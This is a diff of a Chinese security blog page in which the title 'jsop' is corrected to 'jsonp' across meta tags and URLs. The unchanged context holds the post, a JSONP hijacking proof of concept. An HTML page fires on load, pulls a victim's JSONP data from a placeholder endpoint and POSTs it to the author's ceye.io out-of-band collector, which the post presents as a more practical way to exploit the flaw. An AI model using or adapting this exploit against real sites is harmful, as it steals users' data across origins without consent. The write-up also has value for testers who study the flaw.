@@ -82,18 +82,18 @@
 <meta name="description" content="前言之前测jsonp劫持的时候一般是弹个alert，就做poc了， 突然想试试实际利用一下是什么样子，于是就开始尝试做个实际利用的poc。 正文在网上看到一般的证明脚本是 1234567&amp;lt;script&amp;gt;function lego(json)&amp;#123;alert(JSON.stringify(json))  &amp;#125;&amp;lt;/script&amp;gt;&amp;lt;script src=&quot;ht">
 <meta name="keywords" content="前端黑客,jsonp劫持">
 <meta property="og:type" content="article">
-<meta property="og:title" content="用ceye来利用jsop劫持">
-<meta property="og:url" content="https://legoc.github.io/2019/05/01/用ceye来利用jsop劫持/index.html">
+<meta property="og:title" content="用ceye来利用jsonp劫持">
+<meta property="og:url" content="https://legoc.github.io/2019/05/01/用ceye来利用jsonp劫持/index.html">
 <meta property="og:site_name" content="Mugen">
 <meta property="og:description" content="前言之前测jsonp劫持的时候一般是弹个alert，就做poc了， 突然想试试实际利用一下是什么样子，于是就开始尝试做个实际利用的poc。 正文在网上看到一般的证明脚本是 1234567&amp;lt;script&amp;gt;function lego(json)&amp;#123;alert(JSON.stringify(json))  &amp;#125;&amp;lt;/script&amp;gt;&amp;lt;script src=&quot;ht">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://legoc.github.io/2019/05/01/用ceye来利用jsop劫持/1.jpg">
-<meta property="og:image" content="https://legoc.github.io/2019/05/01/用ceye来利用jsop劫持/2.jpg">
-<meta property="og:updated_time" content="2019-05-01T14:45:56.668Z">
+<meta property="og:image" content="https://legoc.github.io/2019/05/01/用ceye来利用jsonp劫持/1.jpg">
+<meta property="og:image" content="https://legoc.github.io/2019/05/01/用ceye来利用jsonp劫持/2.jpg">
+<meta property="og:updated_time" content="2019-05-01T14:55:37.125Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="用ceye来利用jsop劫持">
+<meta name="twitter:title" content="用ceye来利用jsonp劫持">
 <meta name="twitter:description" content="前言之前测jsonp劫持的时候一般是弹个alert，就做poc了， 突然想试试实际利用一下是什么样子，于是就开始尝试做个实际利用的poc。 正文在网上看到一般的证明脚本是 1234567&amp;lt;script&amp;gt;function lego(json)&amp;#123;alert(JSON.stringify(json))  &amp;#125;&amp;lt;/script&amp;gt;&amp;lt;script src=&quot;ht">
-<meta name="twitter:image" content="https://legoc.github.io/2019/05/01/用ceye来利用jsop劫持/1.jpg">
+<meta name="twitter:image" content="https://legoc.github.io/2019/05/01/用ceye来利用jsonp劫持/1.jpg">
 
 
 
@@ -123,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="https://legoc.github.io/2019/05/01/用ceye来利用jsop劫持/"/>
+  <link rel="canonical" href="https://legoc.github.io/2019/05/01/用ceye来利用jsonp劫持/"/>
 
 
 
 
 
-  <title>用ceye来利用jsop劫持 | Mugen</title>
+  <title>用ceye来利用jsonp劫持 | Mugen</title>
   
 
 
@@ -276,7 +276,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://legoc.github.io/2019/05/01/用ceye来利用jsop劫持/">
+    <link itemprop="mainEntityOfPage" href="https://legoc.github.io/2019/05/01/用ceye来利用jsonp劫持/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="lego">
@@ -293,7 +293,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">用ceye来利用jsop劫持</h1>
+          <h1 class="post-title" itemprop="name headline">用ceye来利用jsonp劫持</h1>
         
 
         <div class="post-meta">
@@ -380,7 +380,7 @@
 <p>如果劫持到的数据过多，用get请求的时候会返回414（URI太长 ）</p>
 <p>于是我就想用post的方法去请求</p>
 <p>这种exp不能自动发起请求，需要点击按键。</p>
-<p><img src="/2019/05/01/用ceye来利用jsop劫持/1.jpg" alt="ctf"></p>
+<p><img src="/2019/05/01/用ceye来利用jsonp劫持/1.jpg" alt="ctf"></p>
 <p>与CSRF利用一样，如果用burpsuite生成的csrf-poc是用个submit按钮的，</p>
 <p>在实际利用中还是差一点的，</p>
 <p>所以我还是想让它变得更加实用一点。</p>
@@ -392,7 +392,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP EXP跨域测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"load()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function load()</span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="undefined">$.ajax(&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">url: "http://xxx.com/info?callback=lego",</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">type: "GET",       //指定GET请求方法</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">dataType: "jsonp", //指定服务器返回的数据类型</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">jsonp: "callback", //指定参数名称</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">jsonpCallback: "lego",</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">success: function (data) &#123;</span></span><br><span class="line"><span class="undefined">$.ajax(&#123;</span></span><br><span class="line"><span class="undefined">  type: 'POST',</span></span><br><span class="line"><span class="undefined">  url: 'http://yourceye.ceye.io/',</span></span><br><span class="line"><span class="undefined">  data: JSON.stringify(data)</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>当然，需要在ceye.io中注册一个账号。</p>
 <p>效果</p>
-<p><img src="/2019/05/01/用ceye来利用jsop劫持/2.jpg" alt="ctf"></p>
+<p><img src="/2019/05/01/用ceye来利用jsonp劫持/2.jpg" alt="ctf"></p>
 <p>当然这也不是什么很有技术内容的文章，只是想跟大家分享一下一些小trick，多多包涵。</p>
 
       
@@ -414,7 +414,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://legoc.github.io/2019/05/01/用ceye来利用jsop劫持/" title="用ceye来利用jsop劫持">https://legoc.github.io/2019/05/01/用ceye来利用jsop劫持/</a>
+    <a href="https://legoc.github.io/2019/05/01/用ceye来利用jsonp劫持/" title="用ceye来利用jsonp劫持">https://legoc.github.io/2019/05/01/用ceye来利用jsonp劫持/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
